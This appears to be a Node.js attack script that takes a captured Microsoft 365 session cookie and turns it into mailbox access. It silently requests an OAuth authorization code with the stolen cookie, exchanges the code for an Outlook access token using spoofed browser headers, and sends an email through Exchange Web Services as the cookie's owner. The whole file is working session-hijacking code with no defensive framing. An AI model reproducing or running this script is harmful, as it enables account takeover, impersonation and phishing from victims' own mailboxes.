const { default: axios } = require("axios");
const { runCurl } = require("./src/curl");
const {decode} = require('jsonwebtoken')

async function sendMail (cookie,userAgent) {

var authority = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?"
var client_id = "5e3ce6c0-2b1f-4285-8d4b-75ee78787346"
var scope = "https://outlook.office365.com/.default"
var response_mode="form_post"
var code_challenge = "Wwwup5nUrupE3b_ovz-YulaiC8wby2PMCWIV_8MBwVA"
var response_type="code"

var url = `${authority}client_id=${client_id}&response_mode=${response_mode}&response_type=${response_type}&code_challenge=${code_challenge}&code_challenge_method=S256&scope=${scope}`

var {data} = await axios(`https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=${client_id}
&scope=${scope}
&response_mode=form_post
&response_type=code
&code_challenge=${code_challenge}
&code_challenge_method=S256
&prompt=none
`, {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
     cookie, 
   "Referer": "https://webshell.suite.office.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
}).catch(error => {
  console.log()
})


var authCode = data.split('name=\"code\" value=\"')[1].split('" />')[0]

var payLoad =`curl --write-out '%{json}' 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: ${userAgent}' \
  -H 'sec-ch-ua-platform: "Hacker"' \
  -H 'content-type: application/x-www-form-urlencoded;charset=utf-8' \
  -H 'Accept: */*' \
  -H 'Origin: dog' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: dog/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw 'client_id=${client_id}
  &scope=${scope}
  &code=${authCode}
  &code_verifier=3Na4byE7G0w-nGPTz-iCvtB8ZhBROY5itt987E_8V08
  &grant_type=authorization_code' \
  --compressed
`


var {access_token} = await  runCurl(payLoad)
console.log(data)

var tsd = decode(access_token)
console.log(tsd)

var data =`<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
<soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
</soap:Header>
<soap:Body>
<m:CreateItem MessageDisposition="SendAndSaveCopy">
  <m:SavedItemFolderId>
    <t:DistinguishedFolderId Id="sentitems" />
  </m:SavedItemFolderId>
  <m:Items>
    <t:Message>
      <t:Subject>Company Soccer Team</t:Subject>
      <t:Body BodyType="HTML">Are you interested in joining too?</t:Body>
      <t:ToRecipients>
        <t:Mailbox>
          <t:EmailAddress>${tsd.upn}</t:EmailAddress>
          </t:Mailbox>
      </t:ToRecipients>
    </t:Message>
  </m:Items>
</m:CreateItem>
</soap:Body>
</soap:Envelope>`

var options = {
    method: "post",
    url: "https://outlook.office365.com/EWS/Exchange.asmx",
    headers: {
      Authorization: `Bearer ${access_token}`,
      "content-type": "application/xmnl",
      "user-agent":userAgent,
    },
    data
}





  var {data} = await axios(options).catch(error => {
    console.log(error?.response?.data)
  })


return data

}

module.exports={sendMail}